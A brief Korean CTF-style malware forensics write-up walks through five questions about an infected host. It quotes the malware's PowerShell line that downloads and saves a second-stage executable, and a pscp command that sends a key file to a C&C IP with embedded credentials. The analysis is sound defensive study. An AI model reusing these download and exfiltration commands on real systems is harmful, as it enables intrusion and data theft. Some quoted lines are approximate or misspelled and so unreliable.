
```c
md5 해쉬값 확인법

certuntil -hashfile 파일명 md5
```

문제 1
```c
단말기에 여러 SW를 다운로드받아 설치하던중 감염
최초 설치된 악성코드를 다운로드 받은경로
```

```path
AppData\Local\Google\Chrome\User Data\Default\History
```
해당 History파일은 SQL lite로 분석가능 / 다운로드받은 URL같은게 나온다 해당값이 플래그

문제 2
```c
최초실행한 악성코드의 행위를 분석하여 flag값을 획득하시오
```

IDA 켜주고 .rdata접근후 
```c
\\AppData\\Local\\key.txt
```
이런파일보이는데 접근하면 flag있음

문제3
```c
또다른 악성행위를 하는 악성코드가 추가적으로 다운로드 받아진 것으로 보인다. 단말기에 저장된 파일(MD5)과
다운로드 받은 시각
```

.rdata에 powershell흔적이존재
```c
powershell -Command "Invoke-WebRequest -Url 머시기"
'.com/download/sender.exe -Outfile $env:userprofile\documents\push.exe'
```

이벤트뷰어 -> 응용프로그램 -> Window Powershell 로그분석을통해 sender.exe 시간을 찾을수있음

문제4
```c
감염단말기가 공격자 C&C 서버와 주기적으로 통신할때 사용하는 계정명, 비밀번호, C&C서버 IP주소는 무엇인가
```

위에보면 push.exe도 활용하는걸 볼수있음 해당파일을 IDA로 까보면 UPX로 프로텍터 패킹되어있음

```c
upx폴더 > upx -d push.exe
```
를통해 언패킹

```c
pscp -scp -r -pw navy1!2@ %userprofile--- ket.txt$kcash@192.168.10.128
```

대충이런거 언패킹하고 다시까보면있음 여기에 정보다있음

문제5
```c
C&C서버와 주기적으로 통신할때사용한 프로그램이름
```

pscp를통해 통신함